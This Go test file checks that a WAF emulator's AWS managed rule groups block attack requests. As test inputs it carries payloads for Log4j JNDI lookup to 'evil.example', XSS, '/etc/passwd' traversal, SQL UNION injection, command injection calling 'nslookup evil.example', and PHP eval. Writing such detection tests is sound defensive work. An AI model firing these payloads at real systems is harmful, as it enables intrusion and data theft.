package inspection

import (
	"testing"
	"time"

	wafstore "vorpalstacks/internal/store/aws/waf"
)

// managedGroupACL builds a web ACL whose single rule references a managed
// rule group, with default Allow.
func managedGroupACL(stmt *wafstore.ManagedRuleGroupStatement) *wafstore.WebACL {
	return &wafstore.WebACL{
		Name:          "managed-acl",
		DefaultAction: allowDefaultAction(),
		Rules: []*wafstore.Rule{{
			Name:      "ManagedGroup",
			Priority:  1,
			Statement: &wafstore.Statement{ManagedRuleGroupStatement: stmt},
		}},
	}
}

func managedGroupStatement(name string) *wafstore.ManagedRuleGroupStatement {
	return &wafstore.ManagedRuleGroupStatement{VendorName: "AWS", Name: name}
}

// managedRequest builds a request carrying a User-Agent header, so the
// core rule set's missing-user-agent rule stays out of the way of the
// rule each case actually exercises.
func managedRequest(uri string) *Request {
	req := baseRequest(uri)
	req.Headers = append(req.Headers, Header{Name: "User-Agent", Value: "managed-test-client/1.0"})
	return req
}

func TestManagedRuleGroupCatalogShape(t *testing.T) {
	wantRules := map[string]int{
		"AWSManagedRulesCommonRuleSet":          22,
		"AWSManagedRulesAdminProtectionRuleSet": 1,
		"AWSManagedRulesKnownBadInputsRuleSet":  12,
		"AWSManagedRulesSQLiRuleSet":            8,
		"AWSManagedRulesLinuxRuleSet":           3,
		"AWSManagedRulesUnixRuleSet":            3,
		"AWSManagedRulesWindowsRuleSet":         8,
		"AWSManagedRulesPHPRuleSet":             4,
		"AWSManagedRulesWordPressRuleSet":       2,
		"AWSManagedRulesAmazonIpReputationList": 3,
		"AWSManagedRulesAnonymousIpList":        2,
		"AWSManagedRulesBotControlRuleSet":      38,
		"AWSManagedRulesATPRuleSet":             11,
		"AWSManagedRulesACFPRuleSet":            16,
		"AWSManagedRulesAntiDDoSRuleSet":        3,
	}
	if len(managedRuleGroups) != len(wantRules) {
		t.Fatalf("catalog holds %d groups, want %d", len(managedRuleGroups), len(wantRules))
	}
	for name, count := range wantRules {
		group, ok := LookupManagedRuleGroup("AWS", name)
		if !ok {
			t.Fatalf("group %s missing from the catalog", name)
		}
		if len(group.Rules) != count {
			t.Errorf("group %s holds %d rules, want %d", name, len(group.Rules), count)
		}
		if group.Namespace == "" {
			t.Errorf("group %s has no label namespace", name)
		}
		priorities := map[int32]bool{}
		for _, rule := range group.Rules {
			if rule.Name == "" || rule.Action == "" || rule.Label == "" {
				t.Errorf("group %s has an incomplete rule entry: %+v", name, rule)
			}
			if priorities[rule.Priority] {
				t.Errorf("group %s repeats priority %d", name, rule.Priority)
			}
			priorities[rule.Priority] = true
			if want := group.Namespace + ":"; len(rule.Label) <= len(want) || rule.Label[:len(want)] != want {
				t.Errorf("rule %s of %s carries label %q outside the group namespace", rule.Name, name, rule.Label)
			}
		}
	}
	if _, ok := LookupManagedRuleGroup("OtherVendor", "AWSManagedRulesCommonRuleSet"); ok {
		t.Error("non-AWS vendor resolved to a catalog group")
	}

	// Every rule of the nine signature groups must carry a statement; the
	// data-dependent groups' rules are catalogued without one.
	statementless := map[string]int{
		"AWSManagedRulesAmazonIpReputationList": 3,
		"AWSManagedRulesAnonymousIpList":        2,
		"AWSManagedRulesBotControlRuleSet":      38,
		"AWSManagedRulesATPRuleSet":             11,
		"AWSManagedRulesACFPRuleSet":            16,
		"AWSManagedRulesAntiDDoSRuleSet":        3,
	}
	nilStatements := 0
	for _, group := range managedRuleGroups {
		for _, rule := range group.Rules {
			if rule.Statement == nil {
				nilStatements++
			}
		}
	}
	want := 0
	for _, count := range statementless {
		want += count
	}
	// The Known Bad Inputs ReactJS rule's advisory patterns are not
	// published, so it has no local statement either.
	want++
	if nilStatements != want {
		t.Errorf("catalog holds %d statement-less rules, want %d", nilStatements, want)
	}
}

func TestManagedRuleGroupBlocksLog4JQueryString(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	acl := managedGroupACL(managedGroupStatement("AWSManagedRulesKnownBadInputsRuleSet"))
	req := managedRequest("/search")
	req.RawQuery = "q=%24%7Bjndi:ldap://evil.example/a%7D"

	result := evaluator.Evaluate(acl, req)
	if result.Action != ActionBlock {
		t.Fatalf("Action = %q, want Block", result.Action)
	}
	if len(result.MatchedRules) == 0 {
		t.Fatal("no matched rule recorded")
	}
	entry := result.MatchedRules[0]
	if entry.RuleNameWithinRuleGroup != "AWS#AWSManagedRulesKnownBadInputsRuleSet#Log4JRCE_QUERYSTRING" {
		t.Fatalf("matched rule name = %q", entry.RuleNameWithinRuleGroup)
	}
	wantLabel := "awswaf:managed:aws:known-bad-inputs:Log4JRCE_QueryString"
	found := false
	for _, label := range result.Labels {
		if label == wantLabel {
			found = true
		}
	}
	if !found {
		t.Fatalf("label %q not among %v", wantLabel, result.Labels)
	}
}

func TestManagedRuleGroupScopeDownRestricts(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	stmt := managedGroupStatement("AWSManagedRulesKnownBadInputsRuleSet")
	stmt.ScopeDownStatement = uriMatchStatement("/narrow")
	acl := managedGroupACL(stmt)

	// The Log4j payload outside the scope-down path does not match.
	req := managedRequest("/search")
	req.RawQuery = "q=${jndi:ldap://evil.example/a}"
	if result := evaluator.Evaluate(acl, req); result.Action != ActionAllow {
		t.Fatalf("out-of-scope request Action = %q, want Allow", result.Action)
	}

	// Inside the scope-down path the same payload blocks.
	req = managedRequest("/narrow/search")
	req.RawQuery = "q=${jndi:ldap://evil.example/a}"
	if result := evaluator.Evaluate(acl, req); result.Action != ActionBlock {
		t.Fatalf("in-scope request Action = %q, want Block", result.Action)
	}
}

func TestManagedRuleGroupExcludedRuleCounts(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	stmt := managedGroupStatement("AWSManagedRulesKnownBadInputsRuleSet")
	stmt.ExcludedRules = []wafstore.ExcludedRule{{Name: "Log4JRCE_QUERYSTRING"}}
	acl := managedGroupACL(stmt)

	req := managedRequest("/search")
	req.RawQuery = "q=${jndi:ldap://evil.example/a}"
	result := evaluator.Evaluate(acl, req)
	if result.Action != ActionAllow {
		t.Fatalf("Action = %q, want Allow with the rule excluded to Count", result.Action)
	}
	if len(result.MatchedRules) != 1 || result.MatchedRules[0].Action != ActionCount {
		t.Fatalf("matched rules = %+v, want a single Count entry", result.MatchedRules)
	}
}

func TestManagedRuleGroupRuleActionOverride(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	stmt := managedGroupStatement("AWSManagedRulesKnownBadInputsRuleSet")
	stmt.RuleActionOverrides = []wafstore.RuleActionOverride{
		{
			Name:        "Log4JRCE_QUERYSTRING",
			ActionToUse: &wafstore.Action{Count: &wafstore.CountAction{}},
		},
		{
			// Overrides naming no rule of the group are silently ignored.
			Name:        "NoSuchManagedRule",
			ActionToUse: &wafstore.Action{Block: &wafstore.BlockAction{}},
		},
	}
	acl := managedGroupACL(stmt)

	req := managedRequest("/search")
	req.RawQuery = "q=${jndi:ldap://evil.example/a}"
	result := evaluator.Evaluate(acl, req)
	if result.Action != ActionAllow {
		t.Fatalf("Action = %q, want Allow with the rule overridden to Count", result.Action)
	}
	if len(result.MatchedRules) != 1 || result.MatchedRules[0].Action != ActionCount {
		t.Fatalf("matched rules = %+v, want a single Count entry", result.MatchedRules)
	}
	entry := result.MatchedRules[0]
	if entry.RuleNameWithinRuleGroup != "AWS#AWSManagedRulesKnownBadInputsRuleSet#Log4JRCE_QUERYSTRING" {
		t.Fatalf("within-group name = %q", entry.RuleNameWithinRuleGroup)
	}
	// The override reports the catalog action it replaced.
	if entry.OverriddenAction != ActionBlock {
		t.Fatalf("overridden action = %q, want the catalog Block", entry.OverriddenAction)
	}
}

func TestManagedRuleGroupOverrideActionCountsInnerTermination(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	stmt := managedGroupStatement("AWSManagedRulesKnownBadInputsRuleSet")
	acl := managedGroupACL(stmt)
	acl.Rules[0].OverrideAction = &wafstore.Action{Count: &wafstore.CountAction{}}

	req := managedRequest("/search")
	req.RawQuery = "q=${jndi:ldap://evil.example/a}"
	result := evaluator.Evaluate(acl, req)
	if result.Action != ActionAllow {
		t.Fatalf("Action = %q, want Allow with OverrideAction Count", result.Action)
	}
	if len(result.MatchedRules) != 1 || result.MatchedRules[0].Action != ActionCount {
		t.Fatalf("matched rules = %+v, want a single Count entry", result.MatchedRules)
	}
}

func TestManagedRuleGroupSignatureCoverage(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	cases := []struct {
		group string
		req   *Request
	}{
		{
			"AWSManagedRulesCommonRuleSet",
			func() *Request {
				req := managedRequest("/search")
				req.RawQuery = "a=1&b=<script>alert(1)</script>"
				return req
			}(),
		},
		{
			"AWSManagedRulesCommonRuleSet",
			func() *Request {
				req := managedRequest("/download")
				req.RawQuery = "file=../../etc/passwd"
				return req
			}(),
		},
		{
			"AWSManagedRulesSQLiRuleSet",
			func() *Request {
				req := managedRequest("/items")
				req.RawQuery = "id=1%20UNION%20SELECT%20password%20FROM%20users"
				return req
			}(),
		},
		{
			"AWSManagedRulesLinuxRuleSet",
			func() *Request {
				req := managedRequest("/read")
				req.RawQuery = "path=/proc/version"
				return req
			}(),
		},
		{
			"AWSManagedRulesWindowsRuleSet",
			func() *Request {
				req := managedRequest("/ping")
				req.RawQuery = "h=example.com||nslookup%20evil.example"
				return req
			}(),
		},
		{
			"AWSManagedRulesPHPRuleSet",
			func() *Request {
				req := managedRequest("/upload")
				req.Body = []byte("payload=eval($_GET[cmd]);")
				return req
			}(),
		},
		{
			"AWSManagedRulesWordPressRuleSet",
			managedRequest("/xmlrpc.php"),
		},
		{
			"AWSManagedRulesAdminProtectionRuleSet",
			managedRequest("/phpmyadmin/index.php"),
		},
		{
			"AWSManagedRulesUnixRuleSet",
			func() *Request {
				req := managedRequest("/exec")
				req.RawQuery = "cmd=echo%20%24HOME"
				return req
			}(),
		},
	}
	for _, tc := range cases {
		result := evaluator.Evaluate(managedGroupACL(managedGroupStatement(tc.group)), tc.req)
		if result.Action != ActionBlock {
			t.Errorf("%s did not block %q (query %q, body %q)", tc.group, tc.req.URIPath, tc.req.RawQuery, string(tc.req.Body))
		}
		if len(result.MatchedRules) == 0 || result.MatchedRules[0].RuleNameWithinRuleGroup == "AWS#"+tc.group+"#NoUserAgent_HEADER" {
			t.Errorf("%s blocked through the missing-user-agent rule instead of the signature", tc.group)
		}
	}
}

func TestManagedRuleGroupDataDependentRulesNeverMatch(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	acl := managedGroupACL(managedGroupStatement("AWSManagedRulesAmazonIpReputationList"))

	result := evaluator.Evaluate(acl, baseRequest("/anything"))
	if result.Action != ActionAllow {
		t.Fatalf("Action = %q, want Allow", result.Action)
	}
	if len(result.Unsupported) == 0 {
		t.Fatal("data-dependent rules were not surfaced as unenforced")
	}
}

func TestManagedRuleGroupUnknownGroupNeverMatches(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})
	stmt := &wafstore.ManagedRuleGroupStatement{VendorName: "AWS", Name: "NoSuchManagedRuleGroup"}
	result := evaluator.Evaluate(managedGroupACL(stmt), baseRequest("/"))
	if result.Action != ActionAllow {
		t.Fatalf("Action = %q, want Allow", result.Action)
	}
	if len(result.Unsupported) == 0 {
		t.Fatal("the unknown group was not surfaced as unenforced")
	}
}

func TestManagedRuleGroupCookieHeaderAndHostRules(t *testing.T) {
	evaluator := NewEvaluator(Resolvers{})

	// Host_localhost_HEADER: a localhost host header blocks.
	req := managedRequest("/")
	req.Headers = []Header{
		{Name: "Host", Value: "localhost:8080"},
		{Name: "User-Agent", Value: "managed-test-client/1.0"},
	}
	if result := evaluator.Evaluate(managedGroupACL(managedGroupStatement("AWSManagedRulesKnownBadInputsRuleSet")), req); result.Action != ActionBlock {
		t.Fatalf("localhost host Action = %q, want Block", result.Action)
	}

	// The core rule set's generic LFI rules cover the query arguments,
	// URI path and body, not cookies: a traversal payload confined to a
	// cookie does not match them.
	req = managedRequest("/search")
	req.Cookies = []Header{{Name: "session", Value: "../../etc/passwd"}}
	if result := evaluator.Evaluate(managedGroupACL(managedGroupStatement("AWSManagedRulesCommonRuleSet")), req); result.Action != ActionAllow {
		t.Fatalf("path traversal in a cookie must not match the generic LFI rules, got %q", result.Action)
	}

	// A request without a User-Agent header is blocked by the core rule
	// set's NoUserAgent rule.
	noUA := baseRequest("/search")
	noUAResult := evaluator.Evaluate(managedGroupACL(managedGroupStatement("AWSManagedRulesCommonRuleSet")), noUA)
	if noUAResult.Action != ActionBlock {
		t.Fatalf("missing User-Agent Action = %q, want Block", noUAResult.Action)
	}
	if len(noUAResult.MatchedRules) == 0 || noUAResult.MatchedRules[0].RuleNameWithinRuleGroup != "AWS#AWSManagedRulesCommonRuleSet#NoUserAgent_HEADER" {
		t.Fatalf("matched rules = %+v, want the NoUserAgent rule", noUAResult.MatchedRules)
	}
}

func TestManagedCatalogTimestampIndependent(t *testing.T) {
	// The catalog is immutable static data; evaluating the same request
	// twice must produce identical actions (guards against accidental
	// shared-state mutation between evaluations).
	evaluator := NewEvaluator(Resolvers{})
	stmt := managedGroupStatement("AWSManagedRulesCommonRuleSet")
	acl := managedGroupACL(stmt)
	build := func() *Request {
		req := baseRequest("/search")
		req.RawQuery = "q=<script>alert(1)</script>"
		req.Now = time.Unix(1700000000, 0)
		return req
	}
	first := evaluator.Evaluate(acl, build())
	second := evaluator.Evaluate(acl, build())
	if first.Action != ActionBlock || second.Action != ActionBlock {
		t.Fatalf("actions = %q, %q, want Block twice", first.Action, second.Action)
	}
}
